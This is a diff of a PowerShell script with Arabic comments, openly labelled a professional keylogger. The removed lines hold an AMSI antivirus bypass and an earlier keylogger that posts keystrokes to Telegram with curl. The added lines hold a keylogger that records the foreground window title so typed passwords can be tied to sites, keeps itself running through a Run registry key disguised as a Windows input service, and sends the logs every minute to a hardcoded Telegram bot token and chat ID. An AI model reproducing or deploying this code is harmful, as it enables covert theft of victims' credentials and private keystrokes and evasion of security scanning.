@@ -1,49 +1,62 @@
-# --- [1] خطوة كسر الحماية الذكية (Shadow Bypass) ---
-$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
-$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));
+# --- [STARK OMEGA: GHOST GIANTS-3] ---
+# الوظيفة: راصد لوحة مفاتيح (Keylogger) احترافي مع إرسال تقرير كل دقيقة
 
-# --- [2] إعدادات العميل (Customer_Zero) ---
-$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
-$c = "7393359923"
+$ErrorActionPreference = 'SilentlyContinue'
 
-# --- [3] المحرك الذكي للكيلوجر ---
-$code = {
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -TypeName 'Win32.User32' -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);'
-    
-    $log = "$env:TEMP\sys_log_tmp.txt"
-    $lastWindow = ""
+# الثوابت
+$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
+$CHAT_ID = "7393359923"
 
-    while($true){
-        Start-Sleep -Milliseconds 40
-        # مراقبة النافذة المفتوحة (عشان نعرف هو بيكتب الباسورد فين)
-        $h = [Win32.User32]::GetForegroundWindow()
-        $sb = New-Object System.Text.StringBuilder 256
-        [Win32.User32]::GetWindowText($h, $sb, 256) | Out-Null
-        $currentWindow = $sb.ToString()
-        
-        if($currentWindow -ne $lastWindow){
-            "`n`n[Window: $currentWindow - $(Get-Date)]`n" | Out-File $log -Append
-            $lastWindow = $currentWindow
-        }
+# تعريف الربط مع مكتبة الويندوز الأساسية (User32.dll)
+$Sign = @'
+[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+[DllImport("user32.dll")] public static extern int GetForegroundWindow();
+[DllImport("user32.dll")] public static extern int GetWindowText(int hWnd, System.Text.StringBuilder lpString, int nMaxCount);
+'@
+$API = Add-Type -MemberDefinition $Sign -Name "Win32" -Namespace "Stark" -PassThru
 
-        # تسجيل الحروف (Key Logging)
-        for($i=8; $i -le 254; $i++){
-            $v = [Win32.User32]::GetAsyncKeyState($i)
-            if($v -eq -32767){
-                $k = [System.Windows.Forms.Keys]$i
-                $k | Out-File $log -Append -NoNewline
-            }
-        }
-
-        # إرسال التقرير كل 5 دقائق وتصفيره
-        if((Get-Item $log).Length -gt 500){
-            $content = Get-Content $log -Raw
-            curl.exe -X POST "https://api.telegram.org/bot$using:t/sendMessage" -d "chat_id=$using:c&text=$content"
-            Clear-Content $log
-        }
-    }
+# آلية البقاء (Persistence)
+$path = "$env:APPDATA\Microsoft\Windows\System32_InputHost.ps1"
+if (!(Test-Path $path)) {
+    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
+    $MyContent | Out-File -FilePath $path
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsInputService' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
 }
 
-# تشغيل المهمة في الخلفية بصمت تام
-Start-Job -ScriptBlock $code
+$Log = ""
+$LastWin = ""
+$Timer = [System.Diagnostics.Stopwatch]::StartNew()
+
+while($true) {
+    Start-Sleep -Milliseconds 40 # سرعة رصد عالية جداً
+    
+    # معرفة التطبيق الحالي الذي يكتب فيه الضحية
+    $hWnd = $API::GetForegroundWindow()
+    $Title = New-Object System.Text.StringBuilder 256
+    $API::GetWindowText($hWnd, $Title, 256)
+    
+    if ($Title.ToString() -ne $LastWin) {
+        $LastWin = $Title.ToString()
+        $Log += "`n`n[Window: $LastWin] - $(Get-Date -Format 'HH:mm:ss')`n"
+    }
+
+    # حلقة فحص أزرار الكيبورد (من 8 إلى 255)
+    for ($i = 8; $i -le 255; $i++) {
+        $State = $API::GetAsyncKeyState($i)
+        if ($State -eq -32767) {
+            $Key = [System.Windows.Forms.Keys]$i
+            $Log += "$Key "
+        }
+    }
+
+    # الإرسال كل دقيقة (60 ثانية) إذا كان هناك داتا
+    if ($Timer.Elapsed.TotalSeconds -ge 60) {
+        if ($Log.Length -gt 20) {
+            $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+            $body = @{ chat_id = $CHAT_ID; text = "<b>👻 تقرير الكيبورد (The Ghost):</b>`n<code>$Log</code>"; parse_mode = "HTML" }
+            Invoke-RestMethod -Uri $url -Method Post -Body $body
+            $Log = "" # تفريغ المخزن
+        }
+        $Timer.Restart()
+    }
+}
